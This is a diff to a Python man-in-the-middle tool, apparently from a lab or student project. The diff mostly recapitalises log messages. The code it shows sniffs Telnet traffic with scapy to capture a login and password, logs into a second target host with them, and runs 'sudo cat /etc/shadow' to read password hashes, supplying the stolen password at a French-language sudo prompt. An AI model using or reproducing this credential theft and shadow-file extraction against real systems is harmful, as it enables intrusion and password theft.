@@ -1,8 +1,6 @@
 import telnetlib
-
 from pip._vendor.distlib.compat import raw_input
 from scapy.all import *
-
 from src.mitm.utils import get_mac
 
 user_login = []
@@ -38,7 +36,7 @@ def get_telnet_credentials(pkt):
     elif payload == "b'\\r\\x00'":
         counter = counter + 1
         if counter == 3:
-            print("credentials found in Telnet packets")
+            print("Credentials found in Telnet packets")
             use_telnet_credentials(user_login, user_password)
         else:
             return
@@ -60,14 +58,12 @@ def use_telnet_credentials(login, password):
     print("user login: " + str_login + "| user password: " + str_password)
 
     try:
-        print("connecting to the host " + target2_ip + " ...")
+        print("Connecting to the host " + target2_ip + "...")
         tn = telnetlib.Telnet(target2_ip, 23, 2)
         tn.read_until(b"login: ", 2)
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
-        
-        print("trying to read shadow file content...")
         tn.write(b"sudo cat /etc/shadow\n")
         tn.read_until(b"[sudo] Mot de passe de " + str_login.encode('ascii') + b" : ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
